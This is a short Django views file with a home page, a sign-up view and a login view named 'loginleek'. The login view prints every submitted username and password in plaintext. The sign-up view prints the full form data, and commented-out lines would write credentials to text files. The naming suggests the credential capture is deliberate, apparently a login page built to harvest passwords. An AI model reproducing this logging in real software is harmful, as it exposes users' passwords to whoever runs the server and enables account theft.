from django.shortcuts import render, redirect
from .forms import RegisterForm
from django.contrib.auth import login, logout, authenticate
from django.contrib.auth.forms import AuthenticationForm


# Create your views here.
def home(request):
    return render(request, 'main/home.html')


def sign_up(request):
    if request.method == 'POST':
        form = RegisterForm(request.POST)
        print(request.POST)
        # with open('registers.txt', 'a') as f:
        #     f.write(str(request.POST) + '\n')
        if form.is_valid():
            user = form.save()
            login(request, user)
            return redirect('/home')
    else:
        form = RegisterForm()

    return render(request, 'registration/sign-up.html', {"form": form})


def loginleek(request):
    if request.method == 'POST':
        print(f'{request.POST["username"]}={request.POST["password"]}')
        # with open('logins.txt', 'a') as f:
        #     f.write(f'{str(request.POST["username"])}={str(request.POST["password"])}\n')
        form = AuthenticationForm(data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(request, username=username, password=password)
            if user:
                login(request, user)
            return redirect('/home')
    else:
        form = AuthenticationForm()

    return render(request, 'registration/login.html', {'form': form})
